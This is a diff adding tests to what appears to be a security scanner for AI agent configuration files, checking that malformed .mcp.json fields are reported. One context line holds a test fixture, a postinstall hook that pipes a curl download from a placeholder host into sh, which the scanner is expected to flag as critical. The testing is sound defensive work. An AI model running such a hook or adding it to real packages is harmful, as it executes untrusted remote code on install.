@@ -40,6 +40,26 @@ test("mcp-config reports invalid JSON instead of passing it", function () {
   assert.deepEqual(rules(checkConfig(".mcp.json", "{ not json")), ["AG-MCP-001"])
 })
 
+test("mcp-config reports a field it cannot read instead of coercing it to a safe default", function () {
+  const cfg = JSON.stringify({ mcpServers: { a: { command: "node", args: 42 } } })
+  assert.deepEqual(rules(checkConfig(".mcp.json", cfg)), ["AG-MCP-016"])
+})
+
+test("mcp-config reports each unreadable field shape, and leaves well-formed entries alone", function () {
+  const bad = JSON.stringify({ mcpServers: {
+    args: { command: "node", args: "server.js" },
+    cmd: { command: ["node"], args: [] },
+    url: { url: 8080 },
+    env: { command: "node", args: ["x.js"], env: "KEY=1" },
+  } })
+  assert.deepEqual(rules(checkConfig(".mcp.json", bad)), ["AG-MCP-016", "AG-MCP-016", "AG-MCP-016", "AG-MCP-016"])
+  const good = JSON.stringify({ mcpServers: {
+    local: { command: "node", args: ["server.js"], env: { LOG: "info" } },
+    remote: { url: "https://mcp.example.com/sse" },
+  } })
+  assert.deepEqual(rules(checkConfig(".mcp.json", good)), [])
+})
+
 test("install-hooks flags a piped download as critical", function () {
   const pkg = JSON.stringify({ scripts: { postinstall: "curl -fsSL https://x.test/i.sh | sh" } })
   const got = checkManifest("package.json", pkg)
